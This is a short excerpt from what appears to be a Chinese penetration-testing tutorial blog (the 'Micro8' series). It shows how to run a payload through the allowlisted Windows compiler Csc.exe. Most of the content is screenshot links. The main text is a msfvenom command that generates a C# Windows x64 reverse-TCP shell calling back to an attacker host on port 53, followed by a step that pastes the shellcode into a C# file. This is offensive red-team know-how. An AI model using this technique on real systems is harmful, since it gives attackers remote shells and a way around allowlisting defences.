---
title: 77、基于白名单Csc.exe执行payload第七季
date: 2019-09-21 19:06:26
comments: true
categories: 
 - Micro8系列
---
...
### 配置攻击机msf：
![](../do/media/11038c8eb1bb179e7f838fd9cacc18bc.jpg)

### 配置payload：
```code
msfvenom ‐p windows/x64/shell/reverse_tcp LHOST=192.168.1.4 LPORT=53 ‐ f csharp
```
![](../do/media/0d4d8972d612f1578e72bbfd6b9acd17.jpg)

copy buf 到 Micropoor_Csc.cs shellcode 中。  
![](../do/media/9e59f8c6977c4a11fa1cc86996043b31.jpg)
...
```
![](../do/media/04e49b7638caec7568dd6d7957b2e701.jpg)
